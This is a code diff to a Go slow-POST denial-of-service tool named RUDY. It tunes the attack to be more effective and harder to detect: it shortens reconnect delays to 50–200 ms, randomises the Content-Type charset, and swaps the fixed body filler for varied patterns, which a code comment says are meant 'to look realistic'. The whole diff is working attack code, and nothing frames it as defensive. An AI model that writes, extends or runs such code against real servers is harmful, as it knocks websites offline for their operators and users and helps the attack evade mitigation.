@@ -474,7 +474,8 @@ func (r *RUDY) Execute(ctx context.Context, target Target) error {
 			return nil
 		}
 
-		waitTime := time.Duration(rand.Int63n(int64(3 * time.Second)))
+		// Quick reconnect delay (matching Python: 0.05~0.2s)
+		waitTime := time.Duration(rand.Int63n(150*int64(time.Millisecond))) + 50*time.Millisecond
 		select {
 		case <-ctx.Done():
 			return nil
@@ -556,6 +557,12 @@ func (r *RUDY) selectPath(parsedURL *url.URL) string {
 }
 
 func (r *RUDY) buildHeaders(parsedURL *url.URL, session *RUDYSession) []string {
+	charset := httpdata.RandomCharset()
+	contentType := session.ContentType
+	if strings.Contains(contentType, "application/x-www-form-urlencoded") {
+		contentType = fmt.Sprintf("%s; charset=%s", contentType, charset)
+	}
+
 	headers := []string{
 		fmt.Sprintf("Host: %s", parsedURL.Host),
 		fmt.Sprintf("User-Agent: %s", session.UserAgent),
@@ -563,7 +570,7 @@ func (r *RUDY) buildHeaders(parsedURL *url.URL, session *RUDYSession) []string {
 		fmt.Sprintf("Accept-Language: %s", httpdata.RandomAcceptLanguage()),
 		"Accept-Encoding: identity",
 		fmt.Sprintf("Referer: %s", session.Referer),
-		fmt.Sprintf("Content-Type: %s", session.ContentType),
+		fmt.Sprintf("Content-Type: %s", contentType),
 		fmt.Sprintf("Content-Length: %d", r.config.ContentLength),
 		"Cache-Control: no-cache",
 		"Pragma: no-cache",
@@ -817,9 +824,25 @@ func (r *RUDY) prepareFullData(formData []byte) []byte {
 	fullData := make([]byte, r.config.ContentLength)
 	copy(fullData, formData)
 
-	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
-	for i := len(formData); i < r.config.ContentLength; i++ {
-		fullData[i] = chars[i%len(chars)]
+	// Varied filler patterns to look realistic (matching Python implementation)
+	fillerPatterns := [][]byte{
+		[]byte("A"),
+		[]byte("&x="),
+		[]byte("%20"),
+		[]byte("0"),
+		[]byte("data"),
+	}
+
+	i := len(formData)
+	for i < r.config.ContentLength {
+		pattern := fillerPatterns[rand.Intn(len(fillerPatterns))]
+		for _, b := range pattern {
+			if i >= r.config.ContentLength {
+				break
+			}
+			fullData[i] = b
+			i++
+		}
 	}
 
 	return fullData
